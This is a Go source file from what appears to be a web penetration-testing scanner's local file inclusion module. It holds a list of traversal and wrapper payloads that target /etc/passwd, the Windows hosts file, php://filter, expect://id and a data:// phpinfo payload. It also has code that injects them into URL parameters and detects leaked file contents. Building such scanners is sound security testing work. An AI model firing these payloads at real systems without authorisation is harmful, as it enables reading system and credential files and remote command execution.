package scanners

import (
	"regexp"
	"strings"
	"time"

	"penhunter/types"
)

type LFIScanner struct {
	*BaseScanner
	payloads []string
}

func NewLFIScanner(encoders []string) *LFIScanner {
	payloads := []string{
		"../../../../../../etc/passwd",
		"..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
		"....%2F....%2F....%2Fetc/passwd",
		"..%c0%af..%c0%af..%c0%afetc/passwd",
		"..%c1%9c..%c1%9c..%c1%9cetc/passwd",
		"/etc/passwd",
		"\\etc\\passwd",
		"c:\\windows\\system32\\drivers\\etc\\hosts",
		"..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"../../../../../../windows/system32/drivers/etc/hosts",
		"php://filter/read=string.rot13/resource=../../../../etc/passwd",
		"php://filter/convert.base64-encode/resource=../../../../etc/passwd",
		"expect://id",
		"file:///etc/passwd",
		"data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
	}

	return &LFIScanner{
		BaseScanner: NewBaseScanner("LFI", "high", encoders),
		payloads:    payloads,
	}
}

func (s *LFIScanner) Payloads() []string {
	return s.payloads
}

// DetectLFI checks for file inclusion with baseline comparison to reduce false positives
func (s *LFIScanner) DetectLFI(resp *types.HttpResponse, baselineBody string, payload string) bool {
	body := string(resp.Body)
	baselineLower := strings.ToLower(baselineBody)

	// Strong Linux/Unix /etc/passwd indicators - must have multiple fields
	if strings.Contains(payload, "passwd") || strings.Contains(payload, "etc") {
		passwdPattern := regexp.MustCompile(`[a-z_][a-z0-9_-]*:x:\d+:\d+:[^:]*:[^:]*:[^\n]*`)
		if passwdPattern.MatchString(body) && !passwdPattern.MatchString(baselineBody) {
			return true
		}

		// Check for specific system users that indicate /etc/passwd
		systemUsers := []string{"root:x:0:0", "daemon:x:1:1", "bin:x:2:2", "nobody:x:"}
		for _, user := range systemUsers {
			if strings.Contains(body, user) && !strings.Contains(baselineLower, user) {
				return true
			}
		}
	}

	// Windows hosts file indicators
	if strings.Contains(payload, "hosts") || strings.Contains(payload, "windows") {
		// Windows hosts file specific format
		windowsHostsPattern := regexp.MustCompile(`#.*Copyright.*Microsoft`)
		if windowsHostsPattern.MatchString(body) && !windowsHostsPattern.MatchString(baselineBody) {
			return true
		}
	}

	// PHP wrapper indicators (for php://filter payloads)
	if strings.Contains(payload, "php://") {
		// Base64 encoded content from php://filter
		base64Pattern := regexp.MustCompile(`^[A-Za-z0-9+/=]{50,}$`)
		if base64Pattern.MatchString(strings.TrimSpace(body)) {
			return true
		}
		// PHP source code disclosure
		if strings.Contains(body, "<?php") && !strings.Contains(baselineLower, "<?php") {
			return true
		}
	}

	// PHPInfo detection
	if strings.Contains(payload, "phpinfo") || strings.Contains(payload, "data://") {
		phpInfoPattern := regexp.MustCompile(`<title>phpinfo\(\)</title>|PHP Version \d+\.\d+`)
		if phpInfoPattern.MatchString(body) && !phpInfoPattern.MatchString(baselineBody) {
			return true
		}
	}

	return false
}

func (s *LFIScanner) Detect(resp *types.HttpResponse) bool {
	body := string(resp.Body)

	// Only very strong indicators for fallback detection
	strongIndicators := []string{
		"root:x:0:0:",
		"daemon:x:1:1:",
		"<title>phpinfo()</title>",
	}

	for _, indicator := range strongIndicators {
		if strings.Contains(body, indicator) {
			return true
		}
	}

	return false
}

func (s *LFIScanner) Scan(targetURL string, client types.HttpClient) []*types.Finding {
	var findings []*types.Finding
	seenVulns := make(map[string]bool)

	if !s.hasParameter(targetURL) {
		return findings
	}

	params := s.extractParameters(targetURL)
	if len(params) == 0 {
		return findings
	}

	// Get baseline response for comparison
	baselineResp, _ := client.Get(targetURL, nil)
	baselineBody := ""
	if baselineResp != nil {
		baselineBody = string(baselineResp.Body)
	}

	for _, payload := range s.payloads {
		variants := s.mutatePayload(payload)

		for _, variant := range variants {
			for _, param := range params {
				parts := strings.SplitN(param, "=", 2)
				if len(parts) != 2 {
					continue
				}

				paramName := parts[0]

				// Skip if already found vuln for this param
				vulnKey := targetURL + "|" + paramName
				if seenVulns[vulnKey] {
					continue
				}

				injectedURL := s.injectPayload(targetURL, variant)

				resp, err := client.Get(injectedURL, nil)
				if err != nil {
					continue
				}

				// Use improved detection with baseline comparison
				if s.DetectLFI(resp, baselineBody, variant) {
					evidence := s.extractEvidence(string(resp.Body), variant)
					confidence := 0.90

					finding := s.createFinding(
						injectedURL,
						paramName,
						variant,
						evidence,
						confidence,
						resp.StatusCode,
						string(resp.Body),
					)

					findings = append(findings, finding)
					seenVulns[vulnKey] = true
				}

				time.Sleep(50 * time.Millisecond)
			}
		}
	}

	return findings
}

func (s *LFIScanner) extractEvidence(body, payload string) string {
	// Find file content indicators
	indicators := []string{
		"root:x:0:0",
		"daemon:x:1:1",
		"PHP Version",
		"127.0.0.1",
	}

	for _, indicator := range indicators {
		if idx := strings.Index(body, indicator); idx != -1 {
			start := idx - 100
			if start < 0 {
				start = 0
			}
			end := idx + 200
			if end > len(body) {
				end = len(body)
			}
			return body[start:end]
		}
	}

	return "File inclusion detected"
}

